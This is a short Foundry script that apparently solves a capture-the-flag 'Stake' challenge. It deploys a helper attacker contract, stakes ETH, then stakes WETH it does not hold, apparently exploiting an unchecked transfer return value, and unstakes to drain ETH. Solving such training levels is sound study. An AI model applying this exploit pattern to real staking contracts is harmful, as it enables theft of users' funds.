// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Stake.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackerContract {
    Stake stakeInstance;

    constructor (address _address) {
        stakeInstance = Stake(_address);
    }

    function StakeETH() public payable {
        stakeInstance.StakeETH{ value: msg.value }();
    }
}

contract StakeSolution is Script {
    Stake public stakeInstance = Stake(0xda02499Ac1fDAF7a418eB5867a51ef725366CE18);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Player : ", vm.envAddress("MY_ADDRESS"));

        uint256 amount = 0.0011 ether + 1;

        AttackerContract attackerContract = new AttackerContract(address(stakeInstance));

        attackerContract.StakeETH{ value: amount + 1 }();

        address(stakeInstance.WETH()).call(abi.encodeWithSignature("approve(address,uint256)", address(stakeInstance), type(uint256).max));
        
        stakeInstance.StakeWETH(amount);
        stakeInstance.Unstake(amount);

        vm.stopBroadcast();
    }
}
